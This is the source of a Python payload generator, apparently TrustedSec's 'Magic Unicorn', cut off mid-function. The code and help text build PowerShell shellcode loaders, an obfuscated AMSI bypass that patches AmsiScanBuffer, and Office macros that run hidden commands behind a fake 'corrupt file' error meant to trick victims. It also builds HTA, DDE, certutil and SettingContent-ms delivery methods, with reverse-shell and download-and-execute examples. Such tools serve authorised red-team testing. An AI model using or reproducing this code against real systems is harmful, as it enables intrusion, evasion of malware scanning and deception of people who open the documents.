#!/usr/bin/python3
#
# Magic Unicorn - PowerShell downgrade attack and exploitation tool
#
# Written by: Dave Kennedy (@HackingDave)
# Company: TrustedSec (@TrustedSec) https://www.trustedsec.com
#
# Real quick down and dirty for native x86 powershell on any platform
#
# Usage: python unicorn.py payload reverse_ipaddr port <optional hta or macro>
# Example: python unicorn.py windows/meterpreter/reverse_tcp 192.168.1.5 443
# Macro Example: python unicorn.py windows/meterpreter/reverse_tcp 192.168.1.5 443 macro
# HTA Example: python unicorn.py windows/meterpreter/reverse_tcp 192.168.1.5 443 hta
#
# Requirements: Need to have Metasploit installed if using Metasploit methods.
# Also supports Cobalt Strike and custom shellcode delivery methods.
#
#
# IMPORTANT: Use the --arch flag to match the shellcode architecture. The default is x86.
# x64 shellcode requires the x64 profile.
#
# Special thanks to Matthew Graeber and Josh Kelley
#
import base64
import argparse
import hashlib
import json
import re
import subprocess
import sys
import os
import shutil
import random
import string
import binascii

# python 3 compat
try: input = raw_input
except NameError: pass

#######################################################################################################
# Keep Matt Happy #####################################################################################
#######################################################################################################
# ____  __.                        _____          __    __      ___ _                                ##
#|    |/ _|____   ____ ______     /     \ _____ _/  |__/  |_   /   |   \_____  ______ ______ ___.__. ##
#|      <_/ __ \_/ __ \\____ \   /  \ /  \\__  \\   __\   __\ /    ~    \__  \ \____ \\____ <   |  | ##
#|    |  \  ___/\  ___/|  |_> > /    Y    \/ __ \|  |  |  |   \    Y    // __ \|  |_> >  |_> >___  | ##
#|____|__ \___  >\___  >   __/  \____|__  (____  /__|  |__|    \___|_  /(____  /   __/|   __// ____| ##
#        \/   \/     \/|__|             \/     \/                    \/      \/|__|   |__|   \/      ##
#######################################################################################################
#######################################################################################################


##############################################################################################################
#                                                                                                            #
#                                                                                                            #
# These are configuration options for Unicorn to automatically do certain things such as ASMI Bypassing.     #
# More to come in this section soon, but you will want to configure this to turn it on/off depending         #
# on what you need.                                                                                          #
#                                                                                                            #
##############################################################################################################


# Legacy source switch. Prefer the `--amsi off` command-line option.
# `AMSI_MODE=inline` keeps the bypass and loader in one PowerShell process.
AMSI_BYPASS="ON"

# Generator-level controls. `--amsi`, `--profile`, `--arch`, and `--seed`
# override these defaults without editing the source.
AMSI_MODE="inline"
OUTPUT_PROFILE="auto"
TARGET_ARCH="x86"
OBFUSCATION_LEVEL="minimal"
RANDOM_SEED=None
LAST_SHELLCODE_BYTES=None
LAST_SHELLCODE_SHA256=None
LAST_LOADER_APIS=None
LAST_OBFUSCATION_TRANSFORMS=None
CMD_LENGTH_LIMIT=8191
POWERSHELL_LENGTH_LIMIT=32767


# This will print out the fully decoded command for you instead of running it through the powershell obfuscated
# code.
PRINT_DECODED="OFF"

#
# generate a random string
#
def generate_random_string(low, high):
    length = random.randint(low, high)
    letters = string.ascii_letters  # + string.digits
    return ''.join([random.choice(letters) for _ in range(length)])


# generate a random number based on range
def generate_random_number(low, high):
    for x in range(1): return random.randint(low,high)

def set_generator_seed(seed):
    global RANDOM_SEED
    if seed is None:
        return
    RANDOM_SEED = seed
    random.seed(seed)

def unique_variable_names(count, low=3, high=4):
    names = []
    while len(names) < count:
        candidate = "$" + generate_random_string(low, high)
        if candidate not in names:
            names.append(candidate)
    return names

def unique_plain_names(count, low=3, high=4):
    names = []
    while len(names) < count:
        candidate = generate_random_string(low, high)
        if candidate not in names:
            names.append(candidate)
    return names

def shellcode_literal(shellcode, marker):
    return ",".join(marker + format(byte, "02x") for byte in shellcode)

def parse_shellcode_bytes(data):
    """Return bytes from 0xNN or \\xNN shellcode text."""
    if isinstance(data, bytes):
        return data
    matches = re.findall(r"(?:\\x|0x)([0-9A-Fa-f]{2})", data)
    if not matches:
        return None
    try:
        return bytes(int(value, 16) for value in matches)
    except ValueError:
        return None

def sha256_bytes(data):
    return hashlib.sha256(data).hexdigest()

def obfuscation_transformations(level):
    transforms = ["variable-names", "shellcode-marker", "loader-variant"]
    if level in ("moderate", "high"):
        transforms.append("import-order")
    if level == "high":
        transforms.extend(["whitespace", "numeric-format"])
    return transforms

def shuffled_imports(imports, level):
    if level == "minimal":
        return list(imports)
    return random.sample(imports, len(imports))

def obfuscation_whitespace(loader, level):
    if level == "minimal":
        return loader
    if level == "moderate":
        return loader.replace(";", "; ")
    return loader.replace(";", ";  ")

def format_obfuscated_number(value, level):
    if level == "high" and random.choice([True, False]):
        return str(value)
    return "0x{0:x}".format(value)

def parse_generator_options(argv):
    parser = argparse.ArgumentParser(add_help=False)
    parser.add_argument("--amsi", choices=["off", "inline"], default=None)
    parser.add_argument("--profile", choices=["auto", "cmd", "powershell"], default=None)
    parser.add_argument("--arch", choices=["x86", "x64"], default=None)
    parser.add_argument(
        "--obfuscation",
        choices=["minimal", "moderate", "high"],
        default=None,
    )
    parser.add_argument("--seed", default=None)
    known, remaining = parser.parse_known_args(argv)
    return known, remaining

_generator_options, _remaining_argv = parse_generator_options(sys.argv[1:])
sys.argv = ["unicorn.py"] + _remaining_argv
if _generator_options.amsi:
    AMSI_MODE = _generator_options.amsi
elif AMSI_BYPASS.lower() == "off":
    AMSI_MODE = "off"
if _generator_options.profile:
    OUTPUT_PROFILE = _generator_options.profile
if _generator_options.arch:
    TARGET_ARCH = _generator_options.arch
if _generator_options.obfuscation:
    OBFUSCATION_LEVEL = _generator_options.obfuscation
set_generator_seed(_generator_options.seed)

# randomize words for evasion
def mangle_word(word):
    random_length = generate_random_number(1, len(word))
    counter = 0
    assemble = ""
    for letter in word:
        if counter == random_length:
            assemble = assemble + '"+"' + letter + '"+"' 
        else:
            assemble = assemble + letter
        counter = counter + 1 
    return assemble

# needed for color in unicorn eyes
class ColorsEnum:
    CYAN = '\033[96m'
    BLUE = '\033[94m'
    RED = '\033[91m'
    BOLD = '\033[1m'
    ENDC = '\033[0m'


# display unicorn banner
def gen_unicorn():
    print(r"""
                                                         ,/
                                                        //
                                                      ,//
                                          ___   /|   |//
                                      `__/\_ --(/|___/-/
                                   \|\_-\___ __-_`- /-/ \.
                                  |\_-___,-\_____--/_)' ) \
                                   \ -_ /     __ \( `( __`\|
                                   `\__|      |""" + ColorsEnum.RED + r"""\)\ """ + ColorsEnum.ENDC + r""") """ + ColorsEnum.RED + r"""/(/""" + ColorsEnum.ENDC + r"""|
           ,._____.,            ',--//-|      \  |  '   /
          /     __. \,          / /,---|       \       /
         / /    _. \  \        `/`_/ _,'        |     |
        |  | ( (  \   |      ,/\'__/'/          |     |
        |  \  \`--, `_/_------______/           \(   )/
        | | \  \_. \,                            \___/\
        | |  \_   \  \                                 \
        \ \    \_ \   \   /                             \
         \ \  \._  \__ \_|       |                       \
          \ \___  \      \       |                        \
           \__ \__ \  \_ |       \                         |
           |  \_____ \  ____      |                        |
           | \  \__ ---' .__\     |        |               |
           \  \__ ---   /   )     |        \              /
            \   \____/ / ()(      \          `---_       /|
             \__________/(,--__    \_________.    |    ./ |
               |     \ \  `---_\--,           \   \_,./   |
               |      \  \_ ` \    /`---_______-\   \\    /
                \      \.___,`|   /              \   \\   \
                 \     |  \_ \|   \              (   |:    |
                  \    \      \    |             /  / |    ;
                   \    \      \    \          ( `_'   \  |
                    \.   \      \.   \          `__/   |  |
                      \   \       \.  \                |  |
                       \   \        \  \               (  )
                        \   |        \  |              |  |
                         |  \         \ \              I  `
                         ( __;        ( _;            ('-_';
                         |___\        \___:            \___:


aHR0cHM6Ly93d3cudHJ1c3RlZHNlYy5jb20vd3AtY29udGVudC91cGxvYWRzLzIwMjAvMDUvc29ub2ZhLmpwZw==

                """)


# display amsi help
def amsi_help():
    print("""
[*******************************************************************************************************]

                                  -----AMSI BYPASS INFORMATION----


For a full writeup of this technique and how it works, visit the original research from these locations:

https://0x00-0x00.github.io/research/2018/10/28/How-to-bypass-AMSI-and-Execute-ANY-malicious-powershell-code.html

https://www.cyberark.com/threat-research-blog/amsi-bypass-redux/

Unicorn places the AMSI code and the shellcode loader in one child PowerShell process. This is important
because an AMSI patch applies only to the process that runs it.

Use `--amsi inline` to include the bypass. Use `--amsi off` to omit it. The inline mode makes the command
larger. The `--profile cmd` option rejects commands above 8191 characters. Use `--profile powershell`
for a 32767-character context, or use HTA, macro, or staged delivery.

[*******************************************************************************************************]

    """)

# display macro help
def macro_help():
    print("""
[*******************************************************************************************************]

				-----MACRO ATTACK INSTRUCTIONS----

For the macro attack, you will need to go to File, Properties, Ribbons, and select Developer. Once you do
that, you will have a developer tab. Create a new macro, call it Auto_Open and paste the generated code
into that. This will automatically run. Note that a message will prompt to the user saying that the file
is corrupt and automatically close the excel document. THIS IS NORMAL BEHAVIOR! This is  tricking the
victim to thinking the excel document is corrupted. You should get a shell through powershell injection
after that.

""" +  ColorsEnum.RED + """If you are deploying this against Office365/2016+ versions of Word you need 
to modify the first line of the output from: Sub Auto_Open()
 
To: Sub AutoOpen()
 
The name of the macro itself must also be "AutoOpen" instead of the legacy "Auto_Open" naming scheme.""" + ColorsEnum.ENDC + """

NOTE: WHEN COPYING AND PASTING THE EXCEL, IF THERE ARE ADDITIONAL SPACES THAT ARE ADDED YOU NEED TO
REMOVE THESE AFTER EACH OF THE POWERSHELL CODE SECTIONS UNDER VARIABLE "x" OR A SYNTAX ERROR WILL
HAPPEN!

[*******************************************************************************************************]

	""")


# display hta help
def hta_help():
    print("""
[*******************************************************************************************************]

				-----HTA ATTACK INSTRUCTIONS----

The HTA attack will automatically generate two files, the first the index.html which tells the browser to
use Launcher.hta which contains the malicious powershell injection code. All files are exported to the
hta_attack/ folder and there will be three main files. The first is index.html, second Launcher.hta and the
last, the unicorn.rc (if metasploit was used) file. You can run msfconsole -r unicorn.rc to launch the listener 
for Metasploit. If you didn't use Metasploit, only two files will be exported.

A user must click allow and accept when using the HTA attack in order for the powershell injection to work
properly.

[*******************************************************************************************************]

	""")

# display powershell help
def ps_help():
    print("""
[********************************************************************************************************]

				-----POWERSHELL ATTACK INSTRUCTIONS----

Everything is now generated in two files, powershell_attack.txt and unicorn.rc. The text file contains  all of the code needed in order to inject the powershell attack into memory. Note you will need a place that supports remote command injection of some sort. Often times this could be through an excel/word  doc or through psexec_commands inside of Metasploit, SQLi, etc.. There are so many implications and  scenarios to where you can use this attack at. Simply paste the powershell_attack.txt command in any command prompt window or where you have the ability to call the powershell executable and it will give a shell back to you. This attack also supports windows/download_exec for a payload method instead of just Meterpreter payloads. When using the download and exec, simply put python unicorn.py windows/download_exec url=https://www.thisisnotarealsite.com/payload.exe and the powershell code will download the payload and execute.

Note that you will need to have a listener enabled in order to capture the attack.

[*******************************************************************************************************]
	""")

# display cert help
def cert_help():
    print("""
[*******************************************************************************************************]

				-----CERTUTIL Attack Instruction----

The certutil attack vector was identified by Matthew Graeber (@mattifestation) which allows you to take
a binary file, move it into a base64 format and use certutil on the victim machine to convert it back to
a binary for you. This should work on virtually any system and allow you to transfer a binary to the victim
machine through a fake certificate file. To use this attack, simply place an executable in the path of
unicorn and run python unicorn.py <exe_name> crt in order to get the base64 output. Once that's finished,
go to decode_attack/ folder which contains the files. The bat file is a command that can be run in a
windows machine to convert it back to a binary.

[*******************************************************************************************************]
	""")

# display dde office injection help
def dde_help():
    print("""

[*******************************************************************************************************]

                -----DDE Office COM Attack Instructions----

This attack vector will generate the DDEAUTO formulate to place into Word or Excel. The COM object 
DDEInitilize and DDEExecute allow for formulas to be created directly within Office which causes the
ability to gain remote code execution without the need of macros. This attack was documented and full
instructions can be found at:

https://sensepost.com/blog/2017/macro-less-code-exec-in-msword/

In order to use this attack, run the following examples:

python unicorn.py <payload> <lhost> <lport> dde
python unicorn.py windows/meterpreter/reverse_https 192.168.5.5 443 dde

Once generated, a powershell_attack.txt will be generated which contains the Office code, and the
unicorn.rc file which is the listener component which can be called by msfconsole -r unicorn.rc to
handle the listener for the payload. In addition a download.ps1 will be exported as well (explained
in the latter section).

In order to apply the payload, as an example (from sensepost article):

1. Open Word
2. Insert tab -> Quick Parts -> Field
3. Choose = (Formula) and click ok.
4. Once the field is inserted, you should now see "!Unexpected End of Formula"
5. Right-click the Field, choose "Toggle Field Codes"
6. Paste in the code from Unicorn
7. Save the Word document.

Once the office document is opened, you should receive a shell through powershell injection. Note
that DDE is limited on char size and we need to use Invoke-Expression (IEX) as the method to download.

The DDE attack will attempt to download download.ps1 which is our powershell injection attack since
we are limited to size restrictions. You will need to move the download.ps1 to a location that is
accessible by the victim machine. This means that you need to host the download.ps1 in an Apache2
directory that it has access to.

You may notice that some of the commands use "{ QUOTE" these are ways of masking specific commands
which is documented here: http://staaldraad.github.io/2017/10/23/msword-field-codes/. In this case
we are changing WindowsPowerShell, powershell.exe, and IEX to avoid detection. Also check out the URL
as it has some great methods for not calling DDE at all.

[*******************************************************************************************************]
    """)

def custom_ps1_help():
    print("""
[*******************************************************************************************************]

				-----Custom PS1 Attack Instructions----

This attack method allows you to convert any PowerShell file (.ps1) into an encoded command or macro.

Note if choosing the macro option, a large ps1 file may exceed the amount of carriage returns allowed by
VBA. You may change the number of characters in each VBA string by passing an integer as a parameter.

Examples:

python unicorn.py harmless.ps1
python unicorn.py myfile.ps1 macro
python unicorn.py muahahaha.ps1 macro 500

The last one will use a 500 character string instead of the default 380, resulting in less carriage returns in VBA.

[*******************************************************************************************************]
	""")


# cobalt strike usage banner
def cobalt_strike():
    print("""
[*******************************************************************************************************]

                -----Import Cobalt Strike Beacon----

This method will import direct Cobalt Strike Beacon shellcode directly from Cobalt Strike.

Within Cobalt Strike, export the Cobalt Strike "CS" (C#) export and save it to a file. For example, call 
the file, cobalt_strike_file.cs. 

The export code will look something like this:

* length: 836 bytes */
byte[] buf = new byte[836] { 0xfc, etc

Next, for usage:

python unicorn.py cobalt_strike_file.cs cs

The cs argument tells Unicorn that you want to use the Cobalt strike functionality. The rest is Magic.

Next simply copy the powershell command to something you have the ability for remote command execution.

NOTE: THE FILE MUST BE EXPORTED IN THE C# (CS) FORMAT WITHIN COBALT STRIKE TO PARSE PROPERLY.

There are some caveats with this attack. Note that the payload size will be a little over 14k+ in byte
size. That means that from a command line argument perspective if you copy and paste you will hit the
8191 character size restriction (hardcoded into cmd.exe). If you are launching directly from cmd.exe
this is an issue, however if you are launching directly from PowerShell or other normal applications
this is a non-problem.

A couple examples here, wscript.shell and powershell uses USHORT - 65535 / 2 = 32767 size limit:

typedef struct _UNICODE_STRING {
    USHORT Length;
    USHORT MaximumLength;
    PWSTR  Buffer;
} UNICODE_STRING;

For this attack if you are launching directly from powershell, VBSCript (WSCRIPT.SHELL), there is no
issues.

[*******************************************************************************************************]
    """)

# this is used for custom shellcode generation
def custom_shellcode():
    print("""
[*******************************************************************************************************]

                -----Custom Shellcode Generation Method----

This method will allow you to insert your own shellcode into the Unicorn attack. The PowerShell code
will allocate memory with calloc, copy the bytes, set the memory executable with VirtualProtect, and
start a thread with CreateThread.

Note that in order for this to work, your txt file that you point Unicorn to must be formatted in the 
following format or it will not work:

0x00,0x00,0x00 and so on.

Metasploit C output with \x00 byte literals is also supported.

Unicorn records the command length, architecture, seed, AMSI mode, APIs, and shellcode SHA-256 in
unicorn_manifest.json.

Usage:

python unicorn.py shellcode_formatted_properly.txt shellcode
python unicorn.py shellcode_formatted_properly.txt shellcode --arch x64 --profile cmd
python unicorn.py shellcode_formatted_properly.txt shellcode --amsi off --profile cmd
python unicorn.py shellcode_formatted_properly.txt shellcode --seed test-run

Next simply copy the powershell command to something you have the ability for remote command execution.

NOTE: Supply shellcode that matches the selected architecture. x86 is the default.

There are some caveats with this attack. Note that if your payload size is large in nature it will not
fit in cmd.exe. That means that from a command line argument perspective if you copy and paste you will 
hit the 8191 character size restriction (hardcoded into cmd.exe). If you are launching directly from 
cmd.exe this is an issue, however if you are launching directly from PowerShell or other normal 
applications this is a non-problem.

A couple examples here, wscript.shell and powershell uses USHORT - 65535 / 2 = 32767 size limit:

typedef struct _UNICODE_STRING {
    USHORT Length;
    USHORT MaximumLength;
    PWSTR  Buffer;
} UNICODE_STRING;

For this attack if you are launching directly from powershell, VBSCript (WSCRIPT.SHELL), there is no  
issues.


[*******************************************************************************************************]
    """)

# this is used for custom shellcode generation
def settings_ms():
    print("""
[*******************************************************************************************************]

                -----SettingContent-ms Extension Method----

First, if you haven't had a chance, head over to the awesome SpectreOps blog from Matt Nelson (enigma0x3):

https://posts.specterops.io/the-tale-of-settingcontent-ms-files-f1ea253e4d39

This method uses a specific file type called ".SettingContent-ms" which allows for the ability for both
direct loads from browsers (open + command execution) as well as extension type through embedding in 
office products. This one specifically will focus on extension type settings for command execution
within Unicorn's PowerShell attack vector.

There are multiple methods supported with this attack vector. Since there is a limited character size
with this attack, the method for deployment is an HTA. 

For a detailed understanding on weaponizing this attack visit:

https://www.trustedsec.com/2018/06/weaponizing-settingcontent/

The steps you'll need to do to complete this attack is generate your .SettingContent-ms file from
either a standalone or hta. The HTA method supports Metasploit, Cobalt Strike, and direct
shellcode attacks.

The four methods below on usage: 

HTA SettingContent-ms Metasploit: python unicorn.py windows/meterpreter/reverse_https 192.168.1.5 443 ms
HTA Example SettingContent-ms: python unicorn.py <cobalt_strike_file.cs> cs ms
HTA Example SettingContent-ms: python unicorn.py <path_to_shellcode.txt> shellcode ms
Generate .SettingContent-ms: python unicorn.py ms

The first is a Metasploit payload, the second a Cobalt Strike, the third your own shellcode, and the fourth
just a blank .SettingContent-ms file. 

When everything is generated, it will export a file called Standalone_NoASR.SettingContent-ms either in
the default root Unicorn directory (if using the standalone file generation) or under the hta_attack/
folder. You will need to edit the Standalone_NoASR.SettingContent-ms file and replace:

REPLACECOOLSTUFFHERE

With:

mshta http://<apache_server_ip_or_dns_name/Launcher.hta.

Then move the contents of the hta_attack to /var/www/html.

Once the victim either clicks the .SettingContent-ms file, mshta will be called on the victim machine
then download the Unicorn HTA file which has the code execution capabilites. 

Special thanks and kudos to Matt Nelson for the awesome research

Also check out: https://www.trustedsec.com/2018/06/weaponizing-settingcontent/

Usage: 

python unicorn.py windows/meterpreter/reverse_https 192.168.1.5 443 ms
python unicorn.py <cobalt_strike_file.cs> cs ms
python unicorn.py <path_to_shellcode.txt> shellcode ms
python unicorn.py ms

""")

# usage banner
def gen_usage():
    print("-------------------- Magic Unicorn Attack Vector v3.19 -----------------------------")
    print("\nPowerShell shellcode injection for x86 and x64 targets.")
    print("Written by: Dave Kennedy at TrustedSec (https://www.trustedsec.com)")
    print("Twitter: @TrustedSec, @HackingDave")
    print("Credits: Matthew Graeber, Justin Elze, Chris Gates")
    print("\nHappy Magic Unicorns.")
    print("")
    print("Usage: python unicorn.py payload reverse_ipaddr port <optional hta or macro, crt>")
    print("PS Example: python unicorn.py windows/meterpreter/reverse_https 192.168.1.5 443")
    print("PS Down/Exec: python unicorn.py windows/download_exec url=http://badurl.com/payload.exe")
    print("PS Down/Exec Macro: python unicorn.py windows/download_exec url=http://badurl.com/payload.exe macro")
    print("Macro Example: python unicorn.py windows/meterpreter/reverse_https 192.168.1.5 443 macro")
    print("Macro Example CS: python unicorn.py <cobalt_strike_file.cs> cs macro")
    print("HTA Example: python unicorn.py windows/meterpreter/reverse_https 192.168.1.5 443 hta")
    print("HTA SettingContent-ms Metasploit: python unicorn.py windows/meterpreter/reverse_https 192.168.1.5 443 ms")
    print("HTA Example CS: python unicorn.py <cobalt_strike_file.cs> cs hta")
    print("HTA Example SettingContent-ms: python unicorn.py <cobalt_strike_file.cs> cs ms")
    print("HTA Example SettingContent-ms: python unicorn.py <path_to_shellcode.txt> shellcode ms")
    print("DDE Example: python unicorn.py windows/meterpreter/reverse_https 192.168.1.5 443 dde")
    print("CRT Example: python unicorn.py <path_to_payload/exe_encode> crt")
    print("Custom PS1 Example: python unicorn.py <path to ps1 file>")
    print("Custom PS1 Example: python unicorn.py <path to ps1 file> macro 500")
    print("Cobalt Strike Example: python unicorn.py <cobalt_strike_file.cs> cs (export CS in C# format)")
    print("Custom Shellcode: python unicorn.py <path_to_shellcode.txt> shellcode (formatted 0x00 or metasploit)")
    print("Custom Shellcode HTA: python unicorn.py <path_to_shellcode.txt> shellcode hta (formatted 0x00 or metasploit)")
    print("Custom Shellcode Macro: python unicorn.py <path_to_shellcode.txt> shellcode macro (formatted 0x00 or metasploit)")
    print("Generate .SettingContent-ms: python unicorn.py ms")
    print("AMSI Mode: python unicorn.py <command> --amsi off")
    print("Profile: python unicorn.py <command> --profile cmd|powershell")
    print("Architecture: python unicorn.py <command> --arch x86|x64")
    print("Obfuscation: python unicorn.py <command> --obfuscation minimal|moderate|high")
    print("Reproducibility: python unicorn.py <command> --seed <value>")
    print("Help Menu: python unicorn.py --help\n")

# Using Rasta Mouse AMSI Bypass: https://raw.githubusercontent.com/rasta-mouse/AmsiScanBufferBypass/master/ASBBypass.ps1
def bypass_amsi():
    amsi_string = ("""$1111 = @"\nusing System;using System.Runtime.InteropServices;public class Win32 {[DllImport("$kernel32")]public static extern IntPtr GetProcAddress(IntPtr hModule, string procName);[DllImport("$kernel32")] public static extern IntPtr LoadLibrary(string name);[DllImport("$kernel32")] public static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);}\n"@\nAdd-Type $1111;$2222 = [Win32]::GetProcAddress([Win32]::LoadLibrary("$amsi$dll"), "$amsi$scan$buffer");$3333 = 0;[Win32]::VirtualProtect($2222, [uint32][uint32]5, 0x40, [ref]$3333);$4444 = [Byte[]] (0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3);[System.Runtime.InteropServices.Marshal]::Copy($4444, 0, $2222, 6)""")
    return amsi_string

def build_amsi_bypass():
    marker = random.choice([
        "!", "@", "#", "%", "^", "&", "*", "(", ")", "-", "+", "=", "{", "}",
        "|", ".", ":", ";", "<", ">", "?", "/",
    ])
    kernel32 = mangle_word("kernel32")
    dll = mangle_word(".dll")
    amsi = mangle_word("Amsi")
    scan = mangle_word("Scan")
    buffer = mangle_word("Buffer")
    one, two, three, four = unique_variable_names(4, 5, 10)

    amsi_string = (
        bypass_amsi()
        .replace("$kernel32", kernel32)
        .replace("$dll", dll)
        .replace("$amsi", amsi)
        .replace("$scan", scan)
        .replace("$buffer", buffer)
        .replace("$1111", one)
        .replace("$2222", two)
        .replace("$3333", three)
        .replace("$4444", four)
    )
    placeholder_one = generate_random_string(5, 10)
    placeholder_two = generate_random_string(5, 10)
    original_patch = "{0} = [Byte[]] (0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3);".format(four)
    encoded_patch = (
        four
        + ' = ("'
        + marker + 'xB8' + placeholder_one + ', '
        + marker + 'x' + placeholder_two + ', '
        + marker + 'x' + marker + marker + ', '
        + marker + 'x' + marker + '7, '
        + marker + 'x8' + marker + ', '
        + marker + 'xC3").replace("'
        + placeholder_two + '", "57").replace("'
        + marker + '", "0").replace("B8'
        + placeholder_one + '", "B8");'
        + four + ' = [Byte[]](' + four + ').split(",");'
    )
    return (
        amsi_string
        .replace(original_patch, encoded_patch)
    )

# this will convert any url to hexformat for download/exec payload
def url_hexified(url):
    x = binascii.hexlify(url)
    x = x.decode('utf-8')
    a = [x[i:i+2] for i in range(0, len(x), 2)]
    list = ""
    for goat in a: list = list + "\\x" + goat.rstrip()
    return list

# split string
def split_str(s, length):
    return [s[i:i + length] for i in range(0, len(s), length)]

# write a file to designated path
def write_file(path, text):
    file_write = open(path, "w")
    file_write.write(text)
    file_write.close()


# scramble commmands into multiple strings
def scramble_stuff():
    ps = "powershell.exe"
    list = ""
    for letter in ps:
        letter = '"' + letter.rstrip() + '" & '
        list = list + letter

    full_exe = list[:-2]
    ps_only = full_exe.split(".")[0][:-4]

    wscript = "WScript"
    shell = "Shell"
    list2 = ""
    for letter in wscript:
        letter = '"' + letter.rstrip() + '" & '
        list2 = list2 + letter

    full_wscript = list2[:-2]

    list3 = ""
    for letter in shell:
        letter = '"' + letter.rstrip() + '" & '
        list3 = list3 + letter

    full_shell = list3[:-2]

    return full_exe + "," + ps_only + "," + full_wscript + "," + full_shell

# generate full macro
def vba_escape(value):
    return value.replace('"', '""')

def generate_macro(full_attack, line_length=50):
    macro_rand = generate_random_string(5, 10)
    shell_part1 = generate_random_string(5, 15)
    shell_part2 = generate_random_string(5, 15)
    shell_object = generate_random_string(5, 15)

    if line_length is None:
        line_length_int = 50
    else:
        line_length_int = int(line_length)

    escaped_command = vba_escape(full_attack)
    chunks = split_str(escaped_command, line_length_int)

    macro_str = "Sub Auto_Open()\n"
    macro_str += "Dim {0}\n".format(macro_rand)
    for index, chunk in enumerate(chunks):
        if index == 0:
            macro_str += '{0} = "{1}"\n'.format(macro_rand, chunk)
        else:
            macro_str += '{0} = {0} + "{1}"\n'.format(macro_rand, chunk)

    macro_str += "Dim {0}\n".format(shell_part1)
    macro_str += '{0} = "WScript"\n'.format(shell_part1)
    macro_str += "Dim {0}\n".format(shell_part2)
    macro_str += '{0} = ".Shell"\n'.format(shell_part2)
    macro_str += "Dim {0}\n".format(shell_object)
    macro_str += "Set {0} = CreateObject({1} & {2})\n".format(
        shell_object, shell_part1, shell_part2
    )
    macro_str += "{0}.Run {1}, 0, False\n".format(shell_object, macro_rand)
    macro_str += "Dim title As String\n"
    macro_str += 'title = "Microsoft Office (Compatibility Mode)"\n'
    macro_str += "Dim msg As String\n"
    macro_str += 'msg = "This application appears to have been made with an older version of the Microsoft Office product suite. Please have the author save this document to a newer and supported format. [Error Code: -219]"\n'
    macro_str += "Dim intResponse As Integer\n"
    macro_str += "intResponse = MsgBox(msg, 16, title)\n"
    macro_str += "Application.Quit\n"
    macro_str += "End Sub\n"
    return macro_str

# generate Matthew Graeber's (Matt rocks) attack for binary to cert format #KeepMattHappy
# - https://gist.github.com/mattifestation/47f9e8a431f96a266522
def gen_cert_attack(filename):
    if os.path.isfile(filename):
        # make sure the directory is made
        if not os.path.isdir("decode_attack"):
            os.makedirs("decode_attack")

        # remove old files here
        if os.path.isfile("decode_attack/encoded_attack.crt"):
            os.remove("decode_attack/encoded_attack.crt")

        print("[*] Importing in binary file to base64 encode it for certutil prep.")
        data = open(filename, "rb").read()
        data = base64.b64encode(data).decode("ascii")
        print("[*] Writing out the file to decode_attack/encoded_attack.crt")
        write_file("decode_attack/encoded_attack.crt",
                   "-----BEGIN CERTIFICATE-----\n{0}\n-----END CERTIFICATE-----".format(data))
        print("[*] Filewrite complete, writing out decode string for you..")
        write_file("decode_attack/decode_command.bat",
                   "certutil -decode encoded_attack.crt encoded.exe")
        print("[*] Exported attack under decode_attack/")
        print("[*] There are two files, encoded_attack.crt contains your encoded data")
        print("[*] The second file, decode_command.bat will decode the cert to an executable.")
    else:
        print("[!] File was not found. Exiting the unicorn attack.")
        sys.exit(1)

# Generate HTA launchers and index
def gen_hta_attack(command):
    # HTA code here

    # Each generated attack is one command. AMSI setup and the shellcode loader
    # execute in that command's child PowerShell process.
    commands = [line for line in command.split("\n") if line.strip() and not line.lstrip().startswith("#")]

    # generate random variable names for vba
    hta_rand = generate_random_string(10, 30)

    # split up so we arent calling shell command for cmd.exe
    shell_split1 = generate_random_string(10, 100)
    shell_split2 = generate_random_string(10, 100)
    shell_split3 = generate_random_string(10, 100)
    shell_split4 = generate_random_string(10, 100)
    shell_split5 = generate_random_string(10, 100)

    # 'powershell /w 1 /C "s\'\'v EZE -;s\'\'v KRA e\'\'c;s\'\'v gvH ((g\'\'v EZE).value.toString()+(g\'\'v KRA).value.toString());powershell (g
    ps_split1 = generate_random_string(10, 100)
    ps_split2 = generate_random_string(10, 100)
    ps_split3 = generate_random_string(10, 100)
    ps_split4 = generate_random_string(10, 100)

    main1 = ("""<script>\n{0} = "WS";\n{1} = "crip";\n{2} = "t.Sh";\n{3} = "ell";\n{4} = ({0} + {1} + {2} + {3});\n{6} = "pow";\n{7} = "ersh";\n{8} = "ell";\n{9} = ({6} + {7} + {8});\n{5}=new ActiveXObject({4});\n""".format(shell_split1, shell_split2, shell_split3, shell_split4, shell_split5, hta_rand, ps_split1, ps_split2, ps_split3, ps_split4))
    main2 = ""
    for attack_command in commands:
        attack_command = attack_command.replace("\\", "\\\\").replace("'", "\\'")
        main2 += """{0}.run('{1}', 0);\n""".format(hta_rand, attack_command)
    main2 += "window.close();\n</script>"
    html_code = ("""<iframe id="frame" src="Launcher.hta" application="yes" width=0 height=0 style="hidden" frameborder=0 marginheight=0 marginwidth=0 scrolling=no></iframe>""")

    # remote old directory
    if os.path.isdir("hta_attack"):
        shutil.rmtree("hta_attack") 

    os.makedirs("hta_attack")

    # write out index file
    print("[*] Writing out index file to hta_attack/index.html")
    write_file("hta_attack/index.html", html_code)

    # write out Launcher.hta
    print("[*] Writing malicious hta launcher hta_attack/Launcher.hta")
    write_file("hta_attack/Launcher.hta", main1 + main2)


# format metasploit shellcode
def format_metasploit(data):
    parsed = parse_shellcode_bytes(data)
    if not parsed:
        print("[!] Critical: It does not appear that your shellcode is formatted properly. Shellcode should be in a 0x00,0x01 format or a Metasploit format.")
        print("[!] Example: msfvenom -p LHOST=192.168.5.5 LPORT=443 -p windows/meterpreter/reverse_https -e x86/shikata_ga_nai -f c")
        print("[!] Also ensure your syntax for unicorn is correct. Missing IP address, port, etc. etc. will cause this error.")
        print("Exiting....")
        sys.exit(1)

    return ",".join("0x{0:02x}".format(byte) for byte in parsed)


# generate the actual shellcode through msf
def generate_shellcode(payload, ipaddr, port):
    print("[*] Generating the payload shellcode.. This could take a few seconds/minutes as we create the shellcode...")
    port = port.replace("LPORT=", "")

    # if we are using traditional payloads and not download_exec
    if not "exe=" in ipaddr:
        ipaddr = "LHOST={0}".format(ipaddr)
        port = "LPORT={0}".format(port)

    # if download_exec is being used
    if "url=" in ipaddr:
        # shellcode modified from https://www.exploit-db.com/exploits/24318/ - tested on windows xp, windows 7, windows 10, server 2008, server 2012
